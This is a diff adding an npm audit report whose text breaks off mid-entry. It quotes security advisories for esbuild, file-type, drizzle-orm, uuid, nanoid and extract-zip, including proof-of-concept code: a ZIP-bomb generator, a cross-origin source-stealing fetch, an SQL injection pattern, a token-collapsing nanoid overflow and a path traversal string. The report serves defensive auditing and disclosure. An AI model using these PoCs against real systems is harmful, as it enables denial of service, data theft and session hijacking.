@@ -1,0 +1,584 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1158506,
+          "path": "apps__api>@nestjs/platform-express>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1158507,
+          "path": "apps__api>@nestjs/platform-express>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "qs",
+      "target": "6.16.0",
+      "depth": 4
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "packages__db>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1102341,
+          "path": "packages__db>drizzle-kit>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "file-type",
+      "resolves": [
+        {
+          "id": 1114301,
+          "path": "apps__api>@swc/cli>@xhmikosr/bin-wrapper>@xhmikosr/downloader>file-type",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1114726,
+          "path": "apps__api>@swc/cli>@xhmikosr/bin-wrapper>@xhmikosr/downloader>file-type",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "drizzle-orm",
+      "resolves": [
+        {
+          "id": 1116251,
+          "path": "packages__db>drizzle-orm",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "uuid",
+      "resolves": [
+        {
+          "id": 1119441,
+          "path": "apps__api>@types/uuid>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nanoid",
+      "resolves": [
+        {
+          "id": 1138810,
+          "path": ".>@size-limit/preset-app>@size-limit/time>estimo>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1139455,
+          "path": ".>@size-limit/preset-app>@size-limit/time>estimo>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1153188,
+          "path": ".>@size-limit/preset-app>@size-limit/time>estimo>nanoid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "extract-zip",
+      "resolves": [
+        {
+          "id": 1139346,
+          "path": ".>@size-limit/preset-app>@size-limit/time>estimo>find-chrome-bin>@puppeteer/browsers>extract-zip",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": [
+            "packages__db>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild"
+          ]
+        },
+        {
+          "version": "0.19.12",
+          "paths": [
+            "packages__db>drizzle-kit>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1114301": {
+      "findings": [
+        {
+          "version": "20.5.0",
+          "paths": [
+            "apps__api>@swc/cli>@xhmikosr/bin-wrapper>@xhmikosr/downloader>file-type"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-5v7r-6r5c-r473\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31808\n- https://github.com/sindresorhus/file-type/commit/319abf871b50ba2fa221b4a7050059f1ae096f4f\n- https://github.com/advisories/GHSA-5v7r-6r5c-r473",
+      "created": "2026-03-10T23:57:09.000Z",
+      "id": 1114301,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA denial of service vulnerability exists in the ASF (WMV/WMA) file type detection parser. When parsing a crafted input where an ASF sub-header has a `size` field of zero, the parser enters an infinite loop. The `payload` value becomes negative (-24), causing `tokenizer.ignore(payload)` to move the read position backwards, so the same sub-header is read repeatedly forever.\n\nAny application that uses `file-type` to detect the type of untrusted/attacker-controlled input is affected. An attacker can stall the Node.js event loop with a 55-byte payload.\n\n### Patches\nFixed in version 21.3.1. Users should upgrade to >= 21.3.1.\n\n### Workarounds\nValidate or limit the size of input buffers before passing them to `file-type`, or run file type detection in a worker thread with a timeout.\n\n### References\n- Fix commit: 319abf871b50ba2fa221b4a7050059f1ae096f4f\n\n### Reporter\n\ncrnkovic@lokvica.com",
+      "reported_by": null,
+      "title": "file-type affected by infinite loop in ASF parser on malformed input with zero-size sub-header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31808"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=13.0.0 <21.3.1",
+      "github_advisory_id": "GHSA-5v7r-6r5c-r473",
+      "recommendation": "Upgrade to version 21.3.1 or later",
+      "patched_versions": ">=21.3.1",
+      "updated": "2026-03-10T23:57:11.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-5v7r-6r5c-r473"
+    },
+    "1114726": {
+      "findings": [
+        {
+          "version": "20.5.0",
+          "paths": [
+            "apps__api>@swc/cli>@xhmikosr/bin-wrapper>@xhmikosr/downloader>file-type"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-j47w-4g3g-c36v\n- https://github.com/sindresorhus/file-type/commit/a155cd71323279de173c54e8c530d300d3854fdd\n- https://github.com/sindresorhus/file-type/releases/tag/v21.3.2\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32630\n- https://github.com/sindresorhus/file-type/commit/399b0f156063f5aeb1c124a7fd61028f3ea7c124\n- https://github.com/advisories/GHSA-j47w-4g3g-c36v",
+      "created": "2026-03-13T20:56:05.000Z",
+      "id": 1114726,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA crafted ZIP file can trigger excessive memory growth during type detection in `file-type` when using `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()`.\n\nIn affected versions, the ZIP inflate output limit is enforced for stream-based detection, but not for known-size inputs. As a result, a small compressed ZIP can cause `file-type` to inflate and process a much larger payload while probing ZIP-based formats such as OOXML. In testing on `file-type` `21.3.1`, a ZIP of about `255 KB` caused about `257 MB` of RSS growth during `fileTypeFromBuffer()`.\n\nThis is an availability issue. Applications that use these APIs on untrusted uploads can be forced to consume large amounts of memory and may become slow or crash.\n\n## Root Cause\n\nThe ZIP detection logic applied different limits depending on whether the tokenizer had a known file size.\n\nFor stream inputs, ZIP probing was bounded by `maximumZipEntrySizeInBytes` (`1 MiB`). For known-size inputs such as buffers, blobs, and files, the code instead used `Number.MAX_SAFE_INTEGER` in two relevant places:\n\n```js\nconst maximumContentTypesEntrySize = hasUnknownFileSize(tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nand:\n\n```js\nconst maximumLength = hasUnknownFileSize(this.tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nTogether, these checks allowed a crafted ZIP to bypass the intended inflate limit for known-size APIs and force large decompression during detection of entries such as `[Content_Types].xml`.\n\n## Proof of Concept\n\n```js\nimport {fileTypeFromBuffer} from 'file-type';\nimport archiver from 'archiver';\nimport {Writable} from 'node:stream';\n\nasync function createZipBomb(sizeInMegabytes) {\n\treturn new Promise((resolve, reject) => {\n\t\tconst chunks = [];\n\t\tconst writable = new Writable({\n\t\t\twrite(chunk, encoding, callback) {\n\t\t\t\tchunks.push(chunk);\n\t\t\t\tcallback();\n\t\t\t},\n\t\t});\n\n\t\tconst archive = archiver('zip', {zlib: {level: 9}});\n\t\tarchive.pipe(writable);\n\t\twritable.on('finish', () => {\n\t\t\tresolve(Buffer.concat(chunks));\n\t\t});\n\t\tarchive.on('error', reject);\n\n\t\tconst xmlPrefix = '<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">';\n\t\tconst padding = Buffer.alloc(sizeInMegabytes * 1024 * 1024 - xmlPrefix.length, 0x20);\n\t\tarchive.append(Buffer.concat([Buffer.from(xmlPrefix), padding]), {name: '[Content_Types].xml'});\n\t\tarchive.finalize();\n\t});\n}\n\nconst zip = await createZipBomb(256);\nconsole.log('ZIP size (KB):', (zip.length / 1024).toFixed(0));\n\nconst before = process.memoryUsage().rss;\nawait fileTypeFromBuffer(zip);\nconst after = process.memoryUsage().rss;\n\nconsole.log('RSS growth (MB):', ((after - before) / 1024 / 1024).toFixed(0));\n```\n\nObserved on `file-type` `21.3.1`:\n- ZIP size: about `255 KB`\n- RSS growth during detection: about `257 MB`\n\n## Affected APIs\n\nAffected:\n- `fileTypeFromBuffer()`\n- `fileTypeFromBlob()`\n- `fileTypeFromFile()`\n\nNot affected:\n- `fileTypeFromStream()`, which already enforced the ZIP inflate limit for unknown-size inputs\n\n## Impact\n\nApplications that inspect untrusted uploads with `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()` can be forced to consume excessive memory during ZIP-based type detection. This can degrade service or lead to process termination in memory-constrained environments.\n\n## Cause\n\nThe issue was introduced in 399b0f1",
+      "reported_by": null,
+      "title": "file-type: ZIP Decompression Bomb DoS via [Content_Types].xml entry",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-32630"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=20.0.0 <=21.3.1",
+      "github_advisory_id": "GHSA-j47w-4g3g-c36v",
+      "recommendation": "Upgrade to version 21.3.2 or later",
+      "patched_versions": ">=21.3.2",
+      "updated": "2026-03-16T21:59:51.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-j47w-4g3g-c36v"
+    },
+    "1116251": {
+      "findings": [
+        {
+          "version": "0.40.1",
+          "paths": [
+            "packages__db>drizzle-orm"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/drizzle-team/drizzle-orm/security/advisories/GHSA-gpj5-g38j-94v9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39356\n- https://github.com/advisories/GHSA-gpj5-g38j-94v9",
+      "created": "2026-04-08T00:14:58.000Z",
+      "id": 1116251,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nDrizzle ORM improperly escaped quoted SQL identifiers in its dialect-specific `escapeName()` implementations. In affected versions, embedded identifier delimiters were not escaped before the identifier was wrapped in quotes or backticks.\n\nAs a result, applications that pass attacker-controlled input to APIs that construct SQL identifiers or aliases, such as `sql.identifier()`, `.as()`, may allow an attacker to terminate the quoted identifier and inject SQL.\n\n### Affected components\n\nThe issue affects the identifier escaping logic used by the PostgreSQL, MySQL, SQLite, SingleStore, and Gel dialects.\n\n### Impact\n\nThis issue only affects applications that pass untrusted runtime input into identifier or alias construction. Common examples include dynamic sorting, dynamic report builders, and CTE or alias names derived from request parameters.\n\nDepending on the database dialect, query context, and database permissions, successful exploitation may enable blind or direct data disclosure, schema enumeration, query manipulation, privilege escalation, or destructive operations.\n\nApplications that use only static schema objects, or that strictly map user input through an allowlist of known column or alias names, are not affected.\n\n### Details\n\nIn affected versions, `escapeName()` wrapped the identifier but did not escape the quote delimiter inside the identifier value:\n\n- PostgreSQL / SQLite / Gel: `\"` was not doubled to `\"\"`\n- MySQL / SingleStore: `` ` `` was not doubled to `` `` ``\n\nBecause of this, crafted input containing the dialect-specific identifier delimiter could break out of the quoted identifier and be interpreted as SQL syntax.\n\nA representative vulnerable pattern is dynamic sorting using untrusted input:\n\n```ts\nconst sortField = req.query.sort || 'id';\n\nconst rows = await db\n  .select()\n  .from(users)\n  .orderBy(sql.identifier(sortField));",
+      "reported_by": null,
+      "title": "Drizzle ORM has SQL injection via improperly escaped SQL identifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39356"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "drizzle-orm",
+      "vulnerable_versions": "<0.45.2",
+      "github_advisory_id": "GHSA-gpj5-g38j-94v9",
+      "recommendation": "Upgrade to version 0.45.2 or later",
+      "patched_versions": ">=0.45.2",
+      "updated": "2026-04-08T00:14:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-89"
+      ],
+      "url": "https://github.com/advisories/GHSA-gpj5-g38j-94v9"
+    },
+    "1119441": {
+      "findings": [
+        {
+          "version": "10.0.0",
+          "paths": [
+            "apps__api>@types/uuid>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1138810": {
+      "findings": [
+        {
+          "version": "5.1.5",
+          "paths": [
+            ".>@size-limit/preset-app>@size-limit/time>estimo>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67214\n- https://github.com/ai/nanoid/commit/6ccc67bbaba71d3d77a21d9b636f4171a268ce49\n- https://github.com/ai/nanoid/releases/tag/5.1.16\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-negative-size-in-non-secure-module\n- https://github.com/ai/nanoid/pull/600\n- https://github.com/ai/nanoid/pull/601\n- https://github.com/ai/nanoid/commit/e835c9b71eab832bc6106944bdd26ea96cf2c66d\n- https://github.com/advisories/GHSA-28wg-ghj8-5hjv",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1138810,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.16 contains an infinite loop in the customAlphabet and nanoid functions of its non-secure module (nanoid/non-secure). When these functions are given a negative size, the loop counter is decremented from a negative value and never reaches its termination condition, spinning indefinitely and hanging the calling thread. An application that passes an unvalidated, attacker-controlled negative size to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: non-secure generators can loop indefinitely with negative size",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67214"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": ">=4.0.0 <5.1.16",
+      "github_advisory_id": "GHSA-28wg-ghj8-5hjv",
+      "recommendation": "Upgrade to version 5.1.16 or later",
+      "patched_versions": ">=5.1.16",
+      "updated": "2026-08-07T20:53:01.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-28wg-ghj8-5hjv"
+    },
+    "1139346": {
+      "findings": [
+        {
+          "version": "2.0.1",
+          "paths": [
+            ".>@size-limit/preset-app>@size-limit/time>estimo>find-chrome-bin>@puppeteer/browsers>extract-zip"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ziad626/extract-zip-security-research/security/advisories/GHSA-x7jf-2287-qcpf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-56876\n- https://raw.githubusercontent.com/cisagov/CSAF/develop/csaf_files/IT/white/2026/va-26-177-01.json\n- https://www.cve.org/CVERecord?id=CVE-2026-56876\n- https://github.com/advisories/GHSA-jmr9-qjv8-65gv",
+      "created": "2026-06-26T18:34:00.000Z",
+      "id": 1139346,
+      "npm_advisory_id": null,
+      "overview": "extract-zip does not validate symlink targets when extracting zip archives. When processing a malicious zip file containing a symlink with a relative path like '../../../../etc/passwd', extract-zip will extract the symlink without validation, allowing it to point outside the extraction directory. Depending on how extract-zip is used, an attacker could read or write to arbitrary files.",
+      "reported_by": null,
+      "title": "extract-zip unvalidated symlink path traversal",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-56876"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "extract-zip",
+      "vulnerable_versions": "<=2.0.1",
+      "github_advisory_id": "GHSA-jmr9-qjv8-65gv",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-08-12T19:22:04.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-jmr9-qjv8-65gv"
+    },
+    "1139455": {
+      "findings": [
+        {
+          "version": "5.1.5",
+          "paths": [
+            ".>@size-limit/preset-app>@size-limit/time>estimo>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-67213\n- https://github.com/ai/nanoid/commit/cb3626d0f3342fdf179cd425fd9c4fbb92c7d0e7\n- https://github.com/ai/nanoid/releases/tag/5.1.6\n- https://www.vulncheck.com/advisories/nanoid-before-infinite-loop-via-zero-size-in-customalphabet-and-customrandom\n- https://github.com/ai/nanoid/commit/f9d13f150847d117877adee3460a46eceb0cf49b\n- https://github.com/ai/nanoid/releases/tag/3.3.17\n- https://github.com/ai/nanoid/commit/e10f8d40ce9d1ab47f66d65a16b48086432730d0\n- https://github.com/ai/nanoid/releases/tag/3.3.18\n- https://github.com/advisories/GHSA-2v37-7h3g-55p8",
+      "created": "2026-07-29T15:31:12.000Z",
+      "id": 1139455,
+      "npm_advisory_id": null,
+      "overview": "nanoid (Nano ID) before 5.1.6 contains an infinite loop in the customAlphabet and customRandom functions. When these functions are configured with a size of 0, the internal generation loop never satisfies its exit condition and spins indefinitely, hanging the calling thread. An application that passes an unvalidated, attacker-controlled size of 0 to these functions is exposed to a denial-of-service condition.",
+      "reported_by": null,
+      "title": "nanoid: custom generators can loop indefinitely when size is zero",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-67213"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": ">=4.0.0 <5.1.6",
+      "github_advisory_id": "GHSA-2v37-7h3g-55p8",
+      "recommendation": "Upgrade to version 5.1.6 or later",
+      "patched_versions": ">=5.1.6",
+      "updated": "2026-08-13T15:43:02.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-2v37-7h3g-55p8"
+    },
+    "1153188": {
+      "findings": [
+        {
+          "version": "5.1.5",
+          "paths": [
+            ".>@size-limit/preset-app>@size-limit/time>estimo>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-73086\n- https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4\n- https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3\n- https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac\n- https://github.com/ai/nanoid/releases/tag/3.3.12\n- https://github.com/ai/nanoid/releases/tag/5.1.11\n- https://github.com/advisories/GHSA-xwg4-73v4-xw9w",
+      "created": "2026-09-01T19:23:45.000Z",
+      "id": 1153188,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nAn integer overflow in `nanoid(size)` permanently corrupts the process-wide CSPRNG pool, causing all subsequent ID generation to return the deterministic string `\"uuuuuuuuuuuuuuuuuuuuu\"`. Any application that passes user-influenced values to the `size` parameter loses all randomness guarantees for session tokens, CSRF tokens, and unique identifiers until process restart.\n\n### Details\n\n`nanoid()` at [`index.js:101`](https://github.com/ai/nanoid/blob/main/index.js#L101) coerces the `size` parameter with `size |= 0`, which converts it to a signed 32-bit integer. When `size >= 2^31` (e.g., `2147483648`), this wraps to `-2147483648`.\n\nThe negative value is passed to `fillPool()` ([`index.js:15`](https://github.com/ai/nanoid/blob/main/index.js#L15)):\n\n```javascript\nfunction fillPool(bytes) {\n  if (!pool || pool.length < bytes) {       // false: pool exists, -2B < pool.length\n    pool = Buffer.allocUnsafe(bytes * POOL_SIZE_MULTIPLIER)\n    crypto.getRandomValues(pool)\n    poolOffset = 0\n  } else if (poolOffset + bytes > pool.length) {  // false: poolOffset + (-2B) < pool.length\n    crypto.getRandomValues(pool)\n    poolOffset = 0\n  }\n  poolOffset += bytes  // poolOffset += -2147483648 \u2192 deeply negative\n}\n```\n\nNeither branch triggers, so the pool is never refreshed. `poolOffset` becomes ~-2.1 billion.\n\nSubsequent `nanoid()` calls execute:\n```javascript\nfor (let i = poolOffset - size; i < poolOffset; i++) {\n  id += scopedUrlAlphabet[pool[i] & 63]\n}\n```\n\n`pool[negative_index]` returns `undefined`. `undefined & 63` evaluates to `0`. `urlAlphabet[0]` is `'u'`. Every ID becomes `\"uuuuuuuuuuuuuuuuuuuuu\"`.\n\nThe corruption is **persistent** \u2014 it affects all subsequent calls in the process until ~100 million calls eventually wrap `poolOffset` back to positive, or the process restarts.\n\n### PoC\n\n```javascript\nimport { nanoid } from 'nanoid'\n\n// Step 1: Normal operation\nconsole.log(nanoid())  // e.g., \"V1StGXR8_Z5jdHi6B-myT\"\n\n// Step 2: Trigger overflow (e.g., from an API parameter)\ntry { nanoid(2147483648) } catch(e) {}\n\n// Step 3: All subsequent IDs are deterministic\nconsole.log(nanoid())  // \"uuuuuuuuuuuuuuuuuuuuu\"\nconsole.log(nanoid())  // \"uuuuuuuuuuuuuuuuuuuuu\"\nconsole.log(nanoid())  // \"uuuuuuuuuuuuuuuuuuuuu\"\n// ... forever, process-wide\n```\n\nRun with: `node --experimental-vm-modules poc.mjs`\n\nAttack scenario: Any API endpoint that accepts a user-controlled length/size parameter (URL shortener slug length, configurable token size, etc.) and passes it to `nanoid(userInput)`.\n\n### Impact\n\n**Complete loss of ID unpredictability and uniqueness, process-wide, from a single request.**\n\n- All session IDs, CSRF tokens, API keys, and database identifiers generated after the attack are identical and predictable\n- An attacker can predict all tokens issued to other users, enabling session hijacking and authentication bypass\n- The corruption is persistent (survives across requests) and affects all consumers of `nanoid` in the same process\n- No special privileges or preconditions required \u2014 a single unauthenticated request is sufficient\n- Affects any application that passes external input to the `size` parameter without validation",
+      "reported_by": null,
+      "title": "nanoid: Integer Overflow or Wraparound",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-73086"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nanoid",
+      "vulnerable_versions": ">=4.0.0 <5.1.11",
